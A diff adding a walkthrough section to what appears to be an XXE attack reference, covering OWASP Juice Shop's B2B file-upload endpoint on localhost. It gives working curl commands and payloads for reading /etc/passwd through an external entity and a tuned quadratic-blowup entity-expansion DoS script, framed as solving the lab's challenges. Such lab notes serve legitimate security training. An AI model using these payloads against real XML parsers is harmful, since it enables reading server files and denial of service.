@@ -172,6 +172,53 @@ lxml
 <Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
 ```
 
+### OWASP Juice Shop — B2B `libxmljs` XXE (file read + entity-expansion DoS)
+
+Juice Shop (`http://localhost:3000`, SQLite backend, Angular SPA with client-side-only route guards/validation, exposed auto-CRUD at `/api/{Model}` and `/rest/{noun}`) exposes a real server-side XML parser only in one place: the **B2B order / complaint file-upload** feature. Logged-in users POST an `.xml` file to `/file-upload`; the server parses it with `libxmljs.parseXml(data, { noent: true, noblanks: true })`. `noent: true` resolves both external SYSTEM entities (file read) **and** internal nested entities (expansion DoS) — so the *same* endpoint hosts two distinct challenges. The Angular layer enforces nothing here; the entire control is server-side, so curl works directly once you hold a JWT.
+
+**Probe 0 — confirm the parser path.** Log in, grab the JWT, then upload an `.xml` file (multipart field name `file`):
+```bash
+TOKEN="<JWT from /rest/user/login>"
+printf '<?xml version="1.0"?><order>probe</order>' > /tmp/probe.xml
+curl -s -X POST http://localhost:3000/file-upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Cookie: token=$TOKEN" \
+  -F "file=@/tmp/probe.xml;type=text/xml"
+```
+
+**File read — `XXE Data Access` challenge.** SYSTEM entity reflected back in the parse output. On the Docker/Linux build target `/etc/passwd`; on Windows builds target `C:/Windows/system.ini`:
+```bash
+cat > /tmp/xxe-read.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<order><email>&xxe;</email></order>
+EOF
+curl -s -X POST http://localhost:3000/file-upload \
+  -H "Authorization: Bearer $TOKEN" -H "Cookie: token=$TOKEN" \
+  -F "file=@/tmp/xxe-read.xml;type=text/xml"
+# /etc/passwd contents echoed in the response → XXE Data Access solved
+```
+
+**Entity-expansion DoS — `XXE DoS` challenge (promote from aside to real probe).** Juice Shop guards file read behind a 10 s parse timeout, so a classic billion-laughs that 502s instantly is not the goal — you must keep the `libxmljs` parser *busy >2 s* (the challenge's detection threshold) without tripping the hard timeout or OOM-killing the container. A **quadratic-blowup** payload (one long entity referenced thousands of times) burns CPU more controllably than exponential nested entities. Tune the repeat count so wall-clock parse time lands in the ~2–8 s window:
+```bash
+# Build a quadratic-blowup payload: a ~55 KB base entity referenced 40k times.
+python3 - <<'PY'
+base = "a" * 56000                      # one long internal entity
+refs = "&kaboom;" * 40000               # quadratic work: 56KB * 40k on expansion
+with open("/tmp/xxe-dos.xml", "w") as f:
+    f.write('<?xml version="1.0"?>\n')
+    f.write('<!DOCTYPE kaboom [ <!ENTITY kaboom "%s"> ]>\n' % base)
+    f.write('<order><email>%s</email></order>\n' % refs)
+PY
+# Time the upload — the response should hang >2s (libxmljs noent expansion) before returning/erroring
+time curl -s -o /dev/null -X POST http://localhost:3000/file-upload \
+  -H "Authorization: Bearer $TOKEN" -H "Cookie: token=$TOKEN" \
+  -F "file=@/tmp/xxe-dos.xml;type=text/xml"
+# real >2s (and <10s timeout) → XXE DoS solved. If it returns instantly, raise the repeat count;
+# if it 502s/OOMs, lower base size or ref count — the goal is sustained CPU, not a crash.
+```
+Classic exponential billion-laughs (`&lol9;` chained nine deep) also trips the challenge but risks the OOM-kill / instant-timeout path; prefer the single-level quadratic-blowup above for a reproducible >2 s parse on the `libxmljs` B2B parser. Both file read and DoS reuse the exact same `/file-upload` entry point — only the DTD body differs.
+
 ### Content-Type Swap (JSON to XML)
 ```bash
 # Original JSON request
